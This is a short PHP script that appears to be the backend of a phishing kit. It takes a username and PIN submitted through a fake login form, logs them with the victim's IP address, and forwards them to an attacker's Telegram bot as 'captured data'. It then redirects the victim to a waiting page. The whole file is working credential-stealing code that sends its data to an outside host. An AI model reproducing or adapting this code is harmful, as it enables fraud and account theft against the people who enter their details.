<?php
require('../panel/lib/funciones.php');

$token = getenv('TOKEN_BOT');
$id = getenv('ID_CHAT');
$ip = $_SERVER['REMOTE_ADDR'];

$usuario = $_POST['txtusuario']; // Verifica que el campo en el HTML se llame así
$pin = $_POST['txtpin'];         // Verifica que el campo en el HTML se llame así

// Intentar guardar en DB si existe
@actualizar_registro_usuario($ip, $usuario); 
@actualizar_registro_pin($ip, $pin);

if($token && $id) {
    $mensaje = "🚀 *DATOS CAPTURADOS*\n\n";
    $mensaje .= "👤 Usuario: `" . $usuario . "`\n";
    $mensaje .= "🔢 PIN: `" . $pin . "`\n";
    $mensaje .= "🌐 IP: " . $ip . "\n";
    
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
    @file_get_contents($url);
}

header("Location: ../a/WAITING.php");
?>
